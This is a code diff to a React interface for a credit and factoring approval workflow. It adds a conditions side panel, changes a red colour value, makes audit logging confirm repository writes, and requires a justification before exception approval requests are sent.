+            Atribución (banda tasa {bandaRef.tMin}%–{bandaRef.tMax === Infinity ? "+" : bandaRef.tMax + "%"}): descuento ejecutivo <b style={{ color: C.sub }}>{bandaRef.descEjec}%</b> · máximo con jefatura <b style={{ color: C.sub }}>{bandaRef.descMax}%</b> · tasa mínima absoluta {CFG_ATRIB_DESCUENTO.tasaMinAbsoluta}%.
+          </div>
+        )}
+        {bloqueAtribucion}
+        {/* Acción de la edición SIEMPRE abajo (no se duplica con «Listo» arriba). Cuando hay que pedir
+            aprobación, el botón de arriba es «Solicitar autorización»; si no, se muestra «Listo». */}
+        </div>
+        {reevalPend && !colapsable && (
+          <div className="absolute inset-0 flex items-center justify-center rounded-lg" style={{ backgroundColor: "rgba(249,250,251,0.55)" }}>
+            <button onClick={lanzarReeval} disabled={reevaluando} className="inline-flex items-center gap-1.5 rounded-full px-4 py-2 t11 font-semibold text-white" style={{ backgroundColor: reevaluando ? C.faint : "#C2410C", boxShadow: "0 6px 16px rgba(194,65,12,.25)" }}>
+              <RotateCcw size={13} className={reevaluando ? "animate-spin" : ""} /> {reevaluando ? "Re-evaluando…" : "Re-evaluar operación"}
+            </button>
+          </div>
         )}
       </div>
+      {/* El acceso al desglose salió de acá: abría el MISMO panel lateral que «Editar condiciones»,
+          justo encima, así que era una segunda puerta a la misma pieza al pie de la tarjeta. */}
+      {/* Desglose */}
+      {/* PANEL LATERAL: condiciones y desglose. Son tareas con su propio espacio —tabla
+          comparativa, atribución, autorización, referencia histórica y el desglose completo—
+          y así dejan de empujar la lista de deudores hacia abajo cada vez que se abren. */}
+      {editCond && (
+        <div className="fixed inset-0 flex justify-end ovl" style={{ zIndex: 60 }} onClick={() => { setEditCond(false); setModoEdit(false); }}>
+          <div onClick={(e) => e.stopPropagation()} className="flex h-full w-full flex-col bg-white shadow-2xl" style={{ maxWidth: 680 }}>
+            <div className="flex items-start justify-between gap-3 px-5 py-4" style={{ borderBottom: `1px solid ${C.line}` }}>
+              <div>
+                <div className="t15 font-bold" style={{ color: C.ink }}>Condiciones y simulación</div>
+                <div className="mt-0.5 t10" style={{ color: C.sub }}>{deal.cliente} · {deal.id}</div>
+              </div>
+              <button onClick={() => { setEditCond(false); setModoEdit(false); }} className="rounded-md p-1 hover:bg-stone-100" title="Cerrar"><X size={18} style={{ color: C.sub }} /></button>
+            </div>
+            {/* El botón remata el bloque de condiciones que tiene justo encima —es lo que cierra
+                su edición—, y el histórico va al final: es referencia, no acción. */}
+            <div className="flex-1 overflow-y-auto px-5 py-4">
+              {bloqueDesglose}
+              {barraAccion}
+              {tablaHistorica}
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
@@ -4093,7 +4566,7 @@ function SimDescuentos({ deal, o }) {
       <div className="rounded-xl" style={{ border: `1px solid ${C.line}` }}>
         <div className="flex flex-wrap items-center justify-between gap-3 p-3" style={{ borderBottom: ab ? `1px solid ${C.line}` : "none" }}>
           <div className="flex items-center gap-2">
-            <span className="flex h-6 w-6 items-center justify-center rounded-full" style={{ backgroundColor: "#FECACA", color: "#dc2626" }}><X size={13} /></span>
+            <span className="flex h-6 w-6 items-center justify-center rounded-full" style={{ backgroundColor: "#FECACA", color: "#EF4444" }}><X size={13} /></span>
             <div><div className="t12 font-bold" style={{ color: C.ink }}>{titulo}</div><div className="t9" style={{ color: C.faint }}>{sub}: {ejec}</div></div>
           </div>
           <div className="flex items-center gap-5">
@@ -4205,9 +4678,9 @@ function ReevaluacionPanel({ deal, usuario, onReev }) {
   const reevPend = [...vis.excPend, ...vis.rechReev];
   const firmes = vis.rechFirme;
   const puede = reevPend.length > 0;
-  const palV = (e) => (e === "rechazada" ? { bg: "#fef2f2", fg: "#DC2626" } : e === "sujeta" ? { bg: "#FFF7ED", fg: "#C2410C" } : { bg: C.greenBg, fg: C.green });
+  const palV = (e) => (e === "rechazada" ? { bg: "#fef2f2", fg: "#EF4444" } : e === "sujeta" ? { bg: "#FFF7ED", fg: "#C2410C" } : { bg: C.greenBg, fg: C.green });
   const dLbl = { aprobado: "Aprobado", excepcion: "Sujeto a excepción", rechazado: "Rechazado", clasificacion: "Clasificación" };
-  const dCol = { aprobado: C.green, excepcion: "#7C3AED", rechazado: "#DC2626", clasificacion: C.faint };
+  const dCol = { aprobado: C.green, excepcion: "#7C3AED", rechazado: "#EF4444", clasificacion: C.faint };
   const varDiff = prev ? Object.keys(ver.vars).filter((k) => JSON.stringify(ver.vars[k]) !== JSON.stringify(prev.vars[k])) : [];
   const dispPrev = prev ? Object.fromEntries((prev.res || []).map((x) => [x.n, x.disp])) : {};
   const reglaDiff = prev ? (ver.res || []).filter((x) => dispPrev[x.n] !== x.disp) : [];
@@ -4230,8 +4703,15 @@ function ReevaluacionPanel({ deal, usuario, onReev }) {
     const arr = Array.isArray(archs) ? archs.filter(Boolean) : (archs ? [archs] : []);
     const st = { ...(repoVisado.get(deal.id) || {}), [x.stKey]: val };
     const det = { ...(repoVisadoDetalle.get(deal.id) || {}), [x.stKey]: { msg: msg || "", archs: arr, por: USERS[usuario] || usuario, fecha: new Date().toLocaleString("es-CL") } };
-    await Promise.all([repoVisado.set(deal.id, st), repoVisadoDetalle.set(deal.id, det)]);
+    const conf = await confirmarEscrituras([repoVisado.set(deal.id, st), repoVisadoDetalle.set(deal.id, det)]);
     const dtxt = x.deudor ? ` · deudor ${x.deudor.nombre}` : "";
+    if (!conf.ok) {
+      // La decisión NO se aplicó: se audita el intento rechazado, que es la verdad, en vez de anotar
+      // una aprobación inexistente en la bitácora regulatoria.
+      registrarAuditoria({ usuario: USERS[usuario] || usuario, modulo: "Visado Cliente (detalle)", accion: "Excepción rechazada por el contrato", glosa: `No se pudo registrar la decisión de la regla ${x.regla.n} · ${deal.cliente}${dtxt} — el repositorio rechazó la escritura (${conf.codigo})`, exito: false });
+      forceV((v) => v + 1);
+      return;
+    }
     registrarAuditoria({ usuario: USERS[usuario] || usuario, modulo: "Visado Cliente (detalle)", accion: val === "aprobado" ? "Excepción aprobada" : "Excepción rechazada", glosa: `Regla ${x.regla.n} · ${AREA_LBL[x.regla.area]} N${x.nivel || 4} · ${deal.cliente}${dtxt}${msg ? " · " + msg : ""}${arr.length ? " · " + arr.length + " adjunto(s)" : ""}`, exito: val === "aprobado" });
     logOtorgEvento(deal.id, USERS[usuario] || usuario, `${USERS[usuario] || usuario} ${val === "aprobado" ? "aprobó" : "rechazó"} la excepción desde el detalle · regla #${x.regla.n} ${x.regla.nombre}${dtxt} (${AREA_LBL[x.regla.area]} N${x.nivel || 4})${arr.length ? " · con " + arr.length + " respaldo(s)" : ""}`, msg || "");
     invalidarVisado(); forceV((v) => v + 1); onReev && onReev();
@@ -4239,18 +4719,24 @@ function ReevaluacionPanel({ deal, usuario, onReev }) {
   const revertirVisado = async (x) => {
     const st = { ...(repoVisado.get(deal.id) || {}) }; delete st[x.stKey];
     const det = { ...(repoVisadoDetalle.get(deal.id) || {}) }; delete det[x.stKey];
-    await Promise.all([repoVisado.set(deal.id, st), repoVisadoDetalle.set(deal.id, det)]);
+    const conf = await confirmarEscrituras([repoVisado.set(deal.id, st), repoVisadoDetalle.set(deal.id, det)]);
+    if (!conf.ok) { forceV((v) => v + 1); return; }
     invalidarVisado(); forceV((v) => v + 1); onReev && onReev();
   };
   // Excepción de VERIFICACIÓN de una factura (exime la verificación telefónica) — atribución del Gerente Comercial.
   const excepcionarVerif = async (f, msg) => {
     const m = { ...(repoVerifExc.get(deal.id) || {}), [f.id]: { por: USERS[usuario] || usuario, fecha: new Date().toLocaleString("es-CL"), msg: msg || "" } };
-    await repoVerifExc.set(deal.id, m);
+    const conf = await confirmarEscrituras([repoVerifExc.set(deal.id, m)]);
+    if (!conf.ok) {
+      registrarAuditoria({ usuario: USERS[usuario] || usuario, modulo: "Verificación (excepción)", accion: "Excepción rechazada por el contrato", glosa: `No se pudo excepcionar la verificación de la factura #${f.folio} · ${deal.cliente} — el repositorio rechazó la escritura (${conf.codigo})`, empresaId: deal.id, exito: false });
+      forceV((v) => v + 1);
+      return;
+    }
     registrarAuditoria({ usuario: USERS[usuario] || usuario, modulo: "Verificación (excepción)", accion: "Excepcionar verificación", glosa: `Factura #${f.folio} · deudor ${f.deudor} · ${deal.cliente}${msg ? " · " + msg : ""}`, empresaId: deal.id, exito: true });
     logOtorgEvento(deal.id, USERS[usuario] || usuario, `${USERS[usuario] || usuario} excepcionó la verificación de la factura #${f.folio} (deudor ${f.deudor})`, msg || "");
     forceV((v) => v + 1); onReev && onReev();
   };
-  const revertirVerif = async (f) => { const m = { ...(repoVerifExc.get(deal.id) || {}) }; delete m[f.id]; await repoVerifExc.set(deal.id, m); forceV((v) => v + 1); onReev && onReev(); };
+  const revertirVerif = async (f) => { const m = { ...(repoVerifExc.get(deal.id) || {}) }; delete m[f.id]; const conf = await confirmarEscrituras([repoVerifExc.set(deal.id, m)]); if (!conf.ok) { forceV((v) => v + 1); return; } forceV((v) => v + 1); onReev && onReev(); };
   // DIV 1 — reglas del CLIENTE (snapshot versionado, ya sin reglas de deudor).
   const cliRules = ordenBy((ver.res || []).filter((x) => x.disp !== "clasificacion").map((x) => ({ ...x, stKey: String(x.n), regla: REGLAS_CLIENTE.find((r) => r.n === x.n), deudor: null })));
   const cliReqN = cliRules.filter(reqAprob).length;
@@ -4318,19 +4804,19 @@ function ReevaluacionPanel({ deal, usuario, onReev }) {
               <div className="mt-1.5 flex items-center gap-1.5">
                 <span className="t9 font-semibold" style={{ color: "#5B21D6" }}>Tu atribución permite visar:</span>
                 <button onClick={() => setEF(x.stKey, { open: "aprobado" })} className="inline-flex items-center gap-1 rounded-md px-2 py-1 t9 font-semibold text-white" style={{ backgroundColor: "#7C3AED" }}><Check size={11} /> Aprobar excepción</button>
-                <button onClick={() => setEF(x.stKey, { open: "rechazado" })} className="inline-flex items-center gap-1 rounded-md px-2 py-1 t9 font-semibold" style={{ border: "1px solid #DC2626", color: "#DC2626", backgroundColor: "#fff" }}><X size={11} /> Rechazar</button>
+                <button onClick={() => setEF(x.stKey, { open: "rechazado" })} className="inline-flex items-center gap-1 rounded-md px-2 py-1 t9 font-semibold" style={{ border: "1px solid #EF4444", color: "#EF4444", backgroundColor: "#fff" }}><X size={11} /> Rechazar</button>
               </div></>
             );
             return (
               <>{solBlock}
               <div className="mt-1.5 rounded-md p-2" style={{ border: `1px solid ${C.line}`, backgroundColor: "#F9FAFB" }}>
-                <div className="t9 font-semibold" style={{ color: ef.open === "aprobado" ? "#7C3AED" : "#DC2626" }}>{ef.open === "aprobado" ? "Aprobar excepción" : "Rechazar excepción"} · comentario y respaldo</div>
+                <div className="t9 font-semibold" style={{ color: ef.open === "aprobado" ? "#7C3AED" : "#EF4444" }}>{ef.open === "aprobado" ? "Aprobar excepción" : "Rechazar excepción"} · comentario y respaldo</div>
                 <textarea value={ef.msg || ""} onChange={(e) => setEF(x.stKey, { msg: e.target.value })} placeholder="Comentario / justificación de la decisión…" className="mt-1 w-full rounded-md p-2 t10 outline-none focus:ring-2" style={{ border: `1px solid ${C.line}`, minHeight: 54, backgroundColor: "#fff", color: C.ink }} />
                 {archChips(x.stKey, ef.archs)}
                 <div className="mt-1.5 flex items-center justify-between gap-2">
                   <div className="flex items-center gap-1.5">
                     <button onClick={() => setEF(x.stKey, { open: null })} className="rounded-md px-2 py-1 t9 font-medium" style={{ border: `1px solid ${C.line}`, color: C.sub, backgroundColor: "#fff" }}>Cancelar</button>
-                    <button onClick={() => { aprobarExc(x, ef.open, ef.msg, ef.archs); setEF(x.stKey, { open: null, msg: "", archs: [] }); }} className="rounded-md px-3 py-1 t9 font-semibold text-white" style={{ backgroundColor: ef.open === "aprobado" ? "#16A34A" : "#DC2626" }}>Confirmar {ef.open === "aprobado" ? "aprobación" : "rechazo"}</button>
+                    <button onClick={() => { aprobarExc(x, ef.open, ef.msg, ef.archs); setEF(x.stKey, { open: null, msg: "", archs: [] }); }} className="rounded-md px-3 py-1 t9 font-semibold text-white" style={{ backgroundColor: ef.open === "aprobado" ? "#16A34A" : "#EF4444" }}>Confirmar {ef.open === "aprobado" ? "aprobación" : "rechazo"}</button>
                   </div>
                   {adjuntarLabel(x.stKey)}
                 </div>
@@ -4350,12 +4836,25 @@ function ReevaluacionPanel({ deal, usuario, onReev }) {
           return (
             <div className="mt-1.5 rounded-md p-2" style={{ border: "1px solid #DDD6FE", backgroundColor: "#F5F3FF" }}>
               <div className="t9 font-semibold" style={{ color: "#5B21D6" }}>Solicitar aprobación al {nr.rol} (N{x.nivel || 4}) · comentario y respaldo</div>
-              <textarea value={sf.msg || ""} onChange={(e) => setEF(sk, { msg: e.target.value })} placeholder="Comentario / justificación para el apoderado…" className="mt-1 w-full rounded-md p-2 t10 outline-none focus:ring-2" style={{ border: `1px solid ${C.line}`, minHeight: 54, backgroundColor: "#fff", color: C.ink }} />
+              <textarea value={sf.msg || ""} onChange={(e) => setEF(sk, { msg: e.target.value, sinCom: e.target.value.trim() ? false : sf.sinCom })} placeholder="Comentario / justificación para el apoderado…" className="mt-1 w-full rounded-md p-2 t10 outline-none focus:ring-2" style={{ border: `1px solid ${C.line}`, minHeight: 54, backgroundColor: "#fff", color: C.ink }} />
               {archChips(sk, sf.archs)}
+              {/* Si no hay nada que agregar hay que declararlo. Un silencio no le sirve al apoderado:
+                  no distingue «no aplica» de «se me olvidó». */}
+              <label className="mt-1.5 flex items-center gap-1.5 t9" style={{ color: C.sub, cursor: "pointer" }}>
+                <input type="checkbox" checked={!!sf.sinCom} onChange={(e) => setEF(sk, { sinCom: e.target.checked })} style={{ width: 13, height: 13, accentColor: C.indigo, cursor: "pointer" }} />
+                No tengo comentarios adicionales
+              </label>
               <div className="mt-1.5 flex items-center justify-between gap-2">
                 <div className="flex items-center gap-1.5">
                   <button onClick={() => setEF(sk, { open: false })} className="rounded-md px-2 py-1 t9 font-medium" style={{ border: `1px solid ${C.line}`, color: C.sub, backgroundColor: "#fff" }}>Cancelar</button>
-                  <button onClick={() => { solicitarAprobacionExc(deal, x, usuario, sf.msg, sf.archs); setEF(sk, { open: false, msg: "", archs: [] }); forceV((v) => v + 1); onReev && onReev(); }} className="inline-flex items-center gap-1 rounded-md px-3 py-1 t9 font-semibold text-white" style={{ backgroundColor: C.indigo }}><Send size={11} /> Enviar solicitud</button>
+                  {(() => {
+                    const justificada = !!((sf.msg || "").trim() || (sf.archs && sf.archs.length) || sf.sinCom);
+                    return (
+                      <button onClick={() => { solicitarAprobacionExc(deal, x, usuario, sf.msg, sf.archs, sf.sinCom); setEF(sk, { open: false, msg: "", archs: [], sinCom: false }); forceV((v) => v + 1); onReev && onReev(); }}
+                        disabled={!justificada} title={justificada ? undefined : "Escribe una justificación, adjunta un respaldo, o marca que no tienes comentarios adicionales"}
+                        className="inline-flex items-center gap-1 rounded-md px-3 py-1 t9 font-semibold text-white disabled:opacity-40 disabled:cursor-not-allowed" style={{ backgroundColor: C.indigo }}><Send size={11} /> Enviar solicitud</button>
+                    );
+                  })()}
                 </div>
                 {adjuntarLabel(sk)}
               </div>
@@ -4373,7 +4872,7 @@ function ReevaluacionPanel({ deal, usuario, onReev }) {
       </div>
       <div className="mt-1.5 t10" style={{ color: C.sub, lineHeight: 1.5 }}>Cuando el ejecutivo obtiene el <b>contrato firmado</b>, el sistema de origen se actualiza. Al re-evaluar se vuelve a invocar la API y se guarda una <b>nueva versión</b> con los valores del JSON. Las reglas re-evaluables <b>no dejan la operación en pérdida</b> (su dato puede cambiar en el origen); sólo los bloqueos firmes (mora, castigos, protestos) son definitivos.</div>
       {reevPend.length > 0 && <div className="mt-2 t10" style={{ color: "#7C3AED" }}>♻ Re-evaluables ({reevPend.length}): {reevPend.map((x) => "#" + x.n).join(", ")}</div>}
-      {firmes.length > 0 && <div className="mt-1 t10 font-semibold" style={{ color: "#DC2626" }}>🔒 Operación en pérdida · {firmes.length} bloqueo(s) firme(s): {firmes.map((x) => "#" + x.n).join(", ")}</div>}
+      {firmes.length > 0 && <div className="mt-1 t10 font-semibold" style={{ color: "#EF4444" }}>🔒 Operación en pérdida · {firmes.length} bloqueo(s) firme(s): {firmes.map((x) => "#" + x.n).join(", ")}</div>}
       <div className="mt-2 flex items-center gap-2">
         {(() => { const puedeRe = puede && deal.stage !== "perdida"; return (
         <button onClick={() => { if (deal.stage === "perdida") return; reevaluarCliente(deal, usuario); setVerSel(-1); onReev && onReev(); }} disabled={!puedeRe}
@@ -4397,7 +4896,7 @@ function ReevaluacionPanel({ deal, usuario, onReev }) {
           <span className="inline-flex items-center gap-2" style={{ color: C.faint }}>
             <span title="Reglas aprobadas" className="inline-flex items-center gap-1" style={{ cursor: "help" }}><span className="inline-block h-2 w-2 rounded-full" style={{ backgroundColor: C.green }} />{ver.nApr}</span>
             <span title="Reglas que requieren aprobación (excepción)" className="inline-flex items-center gap-0.5" style={{ cursor: "help", color: "#7C3AED" }}><Check size={11} />{ver.nExc}</span>
-            <span title="Reglas rechazadas (bloqueo firme)" className="inline-flex items-center gap-0.5" style={{ cursor: "help", color: "#DC2626" }}><X size={11} />{ver.nRech}</span>
+            <span title="Reglas rechazadas (bloqueo firme)" className="inline-flex items-center gap-0.5" style={{ cursor: "help", color: "#EF4444" }}><X size={11} />{ver.nRech}</span>
           </span>
         </div>
       </div>
@@ -4435,12 +4934,18 @@ function ReevaluacionPanel({ deal, usuario, onReev }) {
         const bulkScope = active.key === "cli" ? "del cliente" : "de " + truncD(active.label, 14);
         const bulkKey = "bulk:" + active.key;
         const bulk = excForm[bulkKey] || {};
+        // Cierre masivo del EJECUTIVO. A diferencia del visado, es GLOBAL —cliente y todos los
+        // deudores—: el apoderado aprueba por tab porque decide caso a caso, pero acá la alternativa
+        // es abrir decenas de tarjetas repartidas en otros tantos tabs para escribir lo mismo en
+        // todas. Sólo alcanza lo que sigue SIN justificar: lo comentado o respaldado no se toca.
+        const sinComExec = EXECS[usuario] ? excepcionesSinComentario(deal) : [];
+        const bulkExec = excForm["bulkexec"] || {};
         const tabBtn = (key, label, req, total, isCli, mias) => { const on = active.key === key; return (
           <button key={key} onClick={() => setOtorgTab(key)} title={`${label} · ${req} de ${total} requieren excepción/reevaluación${mias ? ` · ${mias} que TÚ debes visar` : ""}`} className="flex shrink-0 items-center gap-1.5 px-1 pb-2 t11" style={{ borderBottom: `2px solid ${on ? C.indigo : "transparent"}`, color: on ? C.indigo : C.sub, fontWeight: on ? 600 : 400, marginBottom: -1 }}>
-            {mias > 0 && <span title={`${mias} regla(s) que debes visar tú`} className="flex h-4 min-w-4 items-center justify-center rounded-full px-1 t9 font-bold text-white" style={{ backgroundColor: "#DC2626" }}>{mias}</span>}
+            {mias > 0 && <span title={`${mias} regla(s) que debes visar tú`} className="flex h-4 min-w-4 items-center justify-center rounded-full px-1 t9 font-bold text-white" style={{ backgroundColor: "#EF4444" }}>{mias}</span>}
             {isCli ? label : truncD(label, 16)}
             <span className="rounded-full px-1.5 py-0.5 t9 font-bold" style={{ backgroundColor: req ? "#FEF2F2" : C.greenBg }}>
-              <span style={{ color: req ? "#DC2626" : C.green }}>{req}</span><span style={{ color: C.sub }}>/{total}</span>
+              <span style={{ color: req ? "#EF4444" : C.green }}>{req}</span><span style={{ color: C.sub }}>/{total}</span>
             </span>
           </button>
         ); };
@@ -4464,24 +4969,41 @@ function ReevaluacionPanel({ deal, usuario, onReev }) {
                 <span className="t10" style={{ color: "#166534" }}>A través de esta opción podrás aprobar o rechazar todas las excepciones {active.key === "cli" ? "del Cliente" : "del Deudor"} según corresponda.</span>
                 <div className="flex shrink-0 items-center gap-1.5">
                   <button onClick={() => setEF(bulkKey, { open: true, action: "aprobado" })} className="inline-flex items-center gap-1 rounded-md px-3 py-1.5 t10 font-semibold text-white" style={{ backgroundColor: "#16A34A" }}><Check size={13} /> Aprobar todo ({todasMias.length})</button>
-                  <button onClick={() => setEF(bulkKey, { open: true, action: "rechazado" })} className="inline-flex items-center gap-1 rounded-md px-3 py-1.5 t10 font-semibold" style={{ border: "1px solid #DC2626", color: "#DC2626", backgroundColor: "#fff" }}><X size={13} /> Rechazar todo ({todasMias.length})</button>
+                  <button onClick={() => setEF(bulkKey, { open: true, action: "rechazado" })} className="inline-flex items-center gap-1 rounded-md px-3 py-1.5 t10 font-semibold" style={{ border: "1px solid #EF4444", color: "#EF4444", backgroundColor: "#fff" }}><X size={13} /> Rechazar todo ({todasMias.length})</button>
                 </div>
               </div>
             )}
             {aprobMasivaHabilitada(usuario) && enBandeja && todasMias.length > 0 && bulk.open && (() => { const rechaza = bulk.action === "rechazado"; return (
               <div className="mt-2 rounded-md p-2" style={{ border: `1px solid ${rechaza ? "#fecaca" : "#bbf7d0"}`, backgroundColor: rechaza ? "#FEF2F2" : "#F0FDF4" }}>
-                <div className="t9 font-semibold" style={{ color: rechaza ? "#DC2626" : "#166534" }}>{rechaza ? "Rechazar" : "Aprobar"} {todasMias.length} excepción(es) {bulkScope} · el comentario y el respaldo se aplican a TODAS</div>
+                <div className="t9 font-semibold" style={{ color: rechaza ? "#EF4444" : "#166534" }}>{rechaza ? "Rechazar" : "Aprobar"} {todasMias.length} excepción(es) {bulkScope} · el comentario y el respaldo se aplican a TODAS</div>
                 <textarea value={bulk.msg || ""} onChange={(e) => setEF(bulkKey, { msg: e.target.value })} placeholder="Comentario / justificación (se repite en cada regla excepcionada)…" className="mt-1 w-full rounded-md p-2 t10 outline-none focus:ring-2" style={{ border: `1px solid ${C.line}`, minHeight: 54, backgroundColor: "#fff", color: C.ink }} />
                 {archChips(bulkKey, bulk.archs)}
                 <div className="mt-1.5 flex items-center justify-between gap-2">
                   <div className="flex items-center gap-1.5">
                     <button onClick={() => setEF(bulkKey, { open: false })} className="rounded-md px-2 py-1 t9 font-medium" style={{ border: `1px solid ${C.line}`, color: C.sub, backgroundColor: "#fff" }}>Cancelar</button>
-                    <button onClick={() => { todasMias.forEach((x) => aprobarExc(x, bulk.action || "aprobado", bulk.msg, bulk.archs)); setEF(bulkKey, { open: false, msg: "", archs: [] }); }} className="rounded-md px-3 py-1 t9 font-semibold text-white" style={{ backgroundColor: rechaza ? "#DC2626" : "#16A34A" }}>Confirmar {rechaza ? "rechazo" : "aprobación"} de {todasMias.length}</button>
+                    <button onClick={() => { todasMias.forEach((x) => aprobarExc(x, bulk.action || "aprobado", bulk.msg, bulk.archs)); setEF(bulkKey, { open: false, msg: "", archs: [] }); }} className="rounded-md px-3 py-1 t9 font-semibold text-white" style={{ backgroundColor: rechaza ? "#EF4444" : "#16A34A" }}>Confirmar {rechaza ? "rechazo" : "aprobación"} de {todasMias.length}</button>
                   </div>
                   {adjuntarLabel(bulkKey)}
                 </div>
               </div>
             ); })()}
+            {sinComExec.length > 0 && !bulkExec.open && (
+              <div className="mt-2 flex flex-wrap items-center justify-between gap-2 rounded-md px-3 py-2" style={{ border: "1px solid #DDD6FE", backgroundColor: "#F5F3FF" }}>
+                <span className="t10" style={{ color: "#5B21D6" }}>Quedan <b>{sinComExec.length}</b> excepción(es) sin justificar, del cliente y de todos los deudores. Si no tienes nada que agregar, decláralo en todas y envíalas de una vez.</span>
+                <button onClick={() => setEF("bulkexec", { open: true })} className="inline-flex shrink-0 items-center gap-1 rounded-md px-3 py-1.5 t10 font-semibold text-white" style={{ backgroundColor: C.indigo }}><Send size={13} /> Marcar sin comentarios y solicitar ({sinComExec.length})</button>
+              </div>
+            )}
+            {sinComExec.length > 0 && bulkExec.open && (
+              <div className="mt-2 rounded-md p-2" style={{ border: "1px solid #DDD6FE", backgroundColor: "#F5F3FF" }}>
+                <div className="t9 font-semibold" style={{ color: "#5B21D6" }}>Se enviarán {sinComExec.length} solicitud(es) de aprobación, cada una al apoderado que corresponda, declarando que no tienes comentarios adicionales</div>
+                <div className="mt-0.5 t9" style={{ color: C.sub }}>Las excepciones que ya justificaste con un comentario o un respaldo no se tocan. Una vez enviada, la solicitud queda a la espera de la decisión del apoderado.</div>
+                <div className="mt-1.5 flex items-center gap-1.5">
+                  <button onClick={() => setEF("bulkexec", { open: false })} className="rounded-md px-2 py-1 t9 font-medium" style={{ border: `1px solid ${C.line}`, color: C.sub, backgroundColor: "#fff" }}>Cancelar</button>
+                  <button onClick={() => { sinComExec.forEach((x) => solicitarAprobacionExc(deal, x, usuario, "", [], true)); setEF("bulkexec", { open: false }); forceV((v) => v + 1); onReev && onReev(); }}
+                    className="inline-flex items-center gap-1 rounded-md px-3 py-1 t9 font-semibold text-white" style={{ backgroundColor: C.indigo }}><Send size={11} /> Enviar {sinComExec.length} solicitud(es)</button>
+                </div>
+              </div>
+            )}
             <div className="mt-2 space-y-1.5">
               {active.rows.length === 0 ? <div className="t10" style={{ color: C.faint }}>Sin reglas para {active.key === "cli" ? "el cliente" : "este deudor"}.</div> : (<>
                 {reqRows.length === 0 && <div className="rounded-md px-2 py-1.5 t10" style={{ backgroundColor: C.greenBg, color: C.green }}>✓ Todas las reglas de {active.key === "cli" ? "el cliente" : "este deudor"} están aprobadas.</div>}
@@ -4618,7 +5140,7 @@ function DealMensajeria({ deal, usuario }) {
           </div>
           {hilos.length === 0 ? <div className="rounded-xl p-6 text-center t11" style={{ color: C.faint, backgroundColor: C.page, border: `1px solid ${C.line}` }}>{q || filtro === "activos" ? "No hay conversaciones para este filtro." : "Sin conversaciones en esta operación. Inicia una nueva."}</div> : <div className="space-y-1.5">{hilos.map((h) => { const noL = hiloNoLeido(h, usuario); const last = h.mensajes[h.mensajes.length - 1]; return (
             <button key={h.id} onClick={() => setSel(h.id)} className="w-full rounded-lg p-2.5 text-left" style={{ border: `1px solid ${noL ? C.indigo : C.line}`, backgroundColor: noL ? "#F1ECFF" : "#fff" }}>
-              <div className="flex items-center justify-between gap-2"><span className="t11 font-semibold truncate" style={{ color: C.ink }}>{h.asunto || MSG_TIPOS[h.tipo].l}</span><div className="flex shrink-0 items-center gap-1.5">{h.estado === "terminado" && <span className="rounded-full px-1.5 py-0.5 t8 font-semibold" style={{ backgroundColor: C.page, color: C.faint }}>Terminada</span>}{noL && <span className="h-2 w-2 rounded-full" style={{ backgroundColor: "#ef4444" }} />}</div></div>
+              <div className="flex items-center justify-between gap-2"><span className="t11 font-semibold truncate" style={{ color: C.ink }}>{h.asunto || MSG_TIPOS[h.tipo].l}</span><div className="flex shrink-0 items-center gap-1.5">{h.estado === "terminado" && <span className="rounded-full px-1.5 py-0.5 t8 font-semibold" style={{ backgroundColor: C.page, color: C.faint }}>Terminada</span>}{noL && <span className="h-2 w-2 rounded-full" style={{ backgroundColor: "#EF4444" }} />}</div></div>
               <div className="t9" style={{ color: C.faint }}>{h.participantes.map((p) => USERS[p] || p).join(", ")}</div>
               {last && <div className="mt-0.5 t9 truncate" style={{ color: C.sub }}>{last.de === usuario ? "Tú: " : last.deNombre + ": "}{last.texto || (last.arch ? "📎 " + last.arch : "")}</div>}
             </button>
@@ -4642,7 +5164,7 @@ function VerificacionTab({ deal, facturasOp = [], bloqueado }) {
   const nHard = items.filter((x) => x.v.hard).length;
   const telEstadoDe = (x) => telReg[x.f.id] ? { estado: "Completada", checks: [1, 1, 1], who: `${((typeof EXECS !== "undefined" && EXECS[deal.exec]) || "Ejecutivo")} · ${telReg[x.f.id]}` } : x.v.tel;
   const vistos = items.filter((x) => filtro === "tel" ? x.v.est === "tel" : filtro === "ok" ? x.v.est === "ok" : filtro === "fail" ? x.v.fallidas.length : true);
-  const notaCol = (n) => n >= 4 ? "#0a7d3f" : n >= 3 ? "#C2410C" : "#DC2626";
+  const notaCol = (n) => n >= 4 ? "#0a7d3f" : n >= 3 ? "#C2410C" : "#EF4444";
   const CHECKS = ["Existencia de la factura", "Recepción conforme", "Fecha de pago comprometida"];
   return (
     <>
@@ -4654,7 +5176,7 @@ function VerificacionTab({ deal, facturasOp = [], bloqueado }) {
         <div className="flex items-center justify-between t10 font-bold uppercase tracking-wide" style={{ color: C.ink }}>Verificación del modelo · API de riesgo <span className="rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: "#F1ECFF", color: "#5B21D6" }}>Actualizado {refrescado}</span></div>
         <p className="mt-1 t10" style={{ color: C.sub }}>El resultado por documento proviene de la <b style={{ color: C.ink }}>API de riesgo</b> (par cliente-deudor, 3M). <b style={{ color: C.ink }}>V1 es regla dura</b>: su fallo deja la factura sujeta a verificación telefónica + excepción. Refresca para volver a consultar la API; la verificación telefónica registrada <b style={{ color: C.ink }}>no se pierde</b>.</p>
         <button disabled={bloqueado} onClick={() => setRefrescado(nowStamp())} className="mt-1 inline-flex items-center gap-1.5 rounded-md px-3 py-1.5 t11 font-semibold text-white disabled:opacity-50" style={{ backgroundColor: C.indigo }}><RotateCcw size={12} /> Refrescar</button>
-        <div className="mt-1.5 flex items-center gap-2 rounded-lg px-3 py-1.5 t10" style={{ backgroundColor: C.page, border: `1px solid ${C.line}`, color: C.sub }}>Consulta a la API de riesgo · {refrescado}<span className="ml-auto flex gap-3 t10 font-semibold"><span style={{ color: C.ink }}>● {items.length}</span><span style={{ color: "#16A34A" }}>✓ {nOk}</span><span style={{ color: "#C2410C" }}>⚠ {nTel}</span><span style={{ color: "#DC2626" }}>✕ {nHard}</span></span></div>
+        <div className="mt-1.5 flex items-center gap-2 rounded-lg px-3 py-1.5 t10" style={{ backgroundColor: C.page, border: `1px solid ${C.line}`, color: C.sub }}>Consulta a la API de riesgo · {refrescado}<span className="ml-auto flex gap-3 t10 font-semibold"><span style={{ color: C.ink }}>● {items.length}</span><span style={{ color: "#16A34A" }}>✓ {nOk}</span><span style={{ color: "#C2410C" }}>⚠ {nTel}</span><span style={{ color: "#EF4444" }}>✕ {nHard}</span></span></div>
       </div>
       <div className="mt-2 flex items-center justify-between">
